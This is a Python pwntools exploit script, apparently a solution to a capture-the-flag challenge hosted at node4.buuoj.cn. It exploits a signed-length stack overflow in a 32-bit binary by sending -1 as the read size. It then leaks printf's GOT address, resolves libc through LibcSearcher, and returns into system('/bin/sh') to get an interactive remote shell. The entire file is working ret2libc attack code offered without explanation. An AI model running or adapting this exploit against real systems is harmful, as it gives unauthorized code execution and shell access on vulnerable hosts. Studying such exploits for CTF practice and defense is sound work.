from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25201)
elf = ELF('./pwn')

def read_anyaddr(addr):
	io.sendlineafter(b'want me to read? ', b'-1')
	io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(elf.plt['printf']) + p32(elf.symbols['vuln']) + p32(addr))
	content = io.recvuntil(b'How', drop=True)
	return len(content)

io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(elf.plt['printf']) + p32(elf.symbols['vuln']) + p32(elf.got['printf']))
io.recvuntil(p32(elf.got['printf']) + b'\n')

# io.recv(4)
printf = u32(io.recv(4))

libc = LibcSearcher('printf', printf)
print(hex(printf))
base = printf - libc.dump('printf')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

print(hex(base))
print(hex(sys))
print(hex(binsh))

io.sendline(b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(sys) + p32(binsh) + p32(binsh))

io.interactive()
